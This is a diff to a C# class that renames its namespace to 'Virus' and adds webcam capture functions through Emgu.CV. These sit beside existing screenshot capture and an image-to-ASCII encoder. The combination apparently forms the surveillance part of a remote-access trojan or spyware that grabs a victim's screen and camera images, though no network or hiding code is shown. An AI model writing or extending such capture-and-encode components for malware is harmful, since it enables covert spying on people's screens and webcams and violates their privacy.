@@ -1,15 +1,14 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+﻿using System.Text;
 using System.Drawing;
 using System.Windows.Forms;
 using System.IO;
+using Emgu.CV;
 
-namespace ToolsSpace {
+namespace Virus {
 
     public class Tools {
+
+        private static VideoCapture capture;
 
         public static Bitmap ScaleImage(Bitmap image, float scaleFactor) {
             return new Bitmap(image, new Size((int)(image.Width * scaleFactor), (int)(image.Height * scaleFactor)));
@@ -21,6 +20,23 @@ namespace ToolsSpace {
             screenshotGraphics.CopyFromScreen(0, 0, 0, 0, new Size(image.Width, image.Height));
             screenshotGraphics.Flush();
             return image;
+        }
+
+        public static void StartWebcam() {
+            if (capture != null) StopWebcam();
+            capture = new VideoCapture();
+        }
+
+        public static void StopWebcam() {
+            if (capture == null) return;
+            capture.Stop();
+            capture.Dispose();
+            capture = null;
+        }
+
+        public static Bitmap GetWebcamImage() {
+            if (capture == null) StartWebcam();
+            return capture.QuerySmallFrame().Bitmap;
         }
 
         public static byte[] EncodeImageToASCII(Image img) {
